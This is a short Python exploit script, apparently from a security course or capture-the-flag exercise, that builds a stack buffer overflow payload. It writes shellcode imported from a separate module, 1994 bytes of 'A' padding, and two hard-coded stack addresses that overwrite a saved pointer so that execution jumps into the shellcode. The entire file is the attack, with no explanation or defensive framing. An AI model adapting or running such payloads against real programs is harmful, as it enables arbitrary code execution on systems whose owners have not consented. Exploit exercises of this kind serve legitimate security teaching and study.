#!/usr/bin/env python3

import sys

from shellcode import shellcode


sys.stdout.buffer.write(shellcode)

padding = b'\x41'*1994
sys.stdout.buffer.write(padding)

a = 0x00007ffffff687c0.to_bytes(8, 'little')
ptr_addr = 0x00007ffffff68fd8.to_bytes(8, 'little')
output = a + ptr_addr
sys.stdout.buffer.write(output)
#sys.stdout.buffer.write(ptr_addr)